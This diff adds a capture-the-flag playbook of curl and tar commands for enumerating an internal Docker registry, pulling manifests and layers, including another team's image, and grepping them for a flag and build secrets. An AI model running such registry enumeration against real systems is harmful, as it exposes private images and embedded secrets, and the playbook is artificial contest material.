@@ -1,0 +1,88 @@
+=================================================================
+STOLEN SCHEMATICS - Step-by-Step Registry Extraction
+=================================================================
+
+COPY AND PASTE THESE COMMANDS ONE AT A TIME IN YOUR SSH SESSION:
+
+-------------------------------------------------------------------
+STEP 1: Verify registry and enumerate all tags
+-------------------------------------------------------------------
+
+echo "=== Registry Catalog ==="
+curl -s http://172.27.0.1:5000/v2/_catalog | python3 -m json.tool
+
+echo -e "\n=== Watcher Tags ==="
+curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-watcher/tags/list | python3 -m json.tool
+
+echo -e "\n=== Diagnostic Tags ==="
+curl -s http://172.27.0.1:5000/v2/infra/stolen-schematics-diagnostic/tags/list | python3 -m json.tool
+
+-------------------------------------------------------------------
+STEP 2: Get watcher v1 manifest (contains layer digests)
+-------------------------------------------------------------------
+
+curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-watcher/manifests/v1 \
+  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" | python3 -m json.tool
+
+-------------------------------------------------------------------
+STEP 3: Get team131-fix manifest (IMPORTANT - other team's version!)
+-------------------------------------------------------------------
+
+curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-watcher/manifests/team131-fix \
+  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" | python3 -m json.tool
+
+-------------------------------------------------------------------
+STEP 4: Run the automated Python extraction script
+-------------------------------------------------------------------
+
+# Upload and run the Python script
+python3 << 'PYEND'
+# Paste contents of stolen_extract_all_layers.py here
+PYEND
+
+-------------------------------------------------------------------
+OR MANUAL APPROACH: Extract specific layer
+-------------------------------------------------------------------
+
+# After Step 2/3, you'll see layer digests like:
+# "digest": "sha256:abc123..."
+
+# Download a specific layer (replace <DIGEST> with actual value):
+mkdir -p /tmp/layers && cd /tmp/layers
+curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-watcher/blobs/sha256:<DIGEST> -o layer.tar.gz
+
+# List contents
+tar -tzf layer.tar.gz | head -50
+
+# Extract
+mkdir extracted
+tar -xzf layer.tar.gz -C extracted/
+
+# Find sync-loop.sh
+find extracted/ -name "*sync*"
+cat extracted/opt/mc/scripts/sync-loop.sh 2>/dev/null
+
+# Search for flag
+grep -r "TDHT{" extracted/ 2>/dev/null
+find extracted/ -type f -exec strings {} \; | grep "TDHT{"
+
+-------------------------------------------------------------------
+WHAT TO LOOK FOR:
+-------------------------------------------------------------------
+
+1. sync-loop.sh source code - tells us the REAL exploit method
+2. Flag embedded in a layer file
+3. Build-time secrets/environment variables
+4. Differences between v1 and team131-fix versions
+5. Config files showing expected format
+
+-------------------------------------------------------------------
+EXPECTED OUTCOMES:
+-------------------------------------------------------------------
+
+✅ Find sync-loop.sh → Learn correct config format → Trigger watcher
+✅ Find flag directly in layers → Submit immediately
+✅ Find clues about .sync directory access method
+✅ Find environment variables or build args with flag
+
+=================================================================
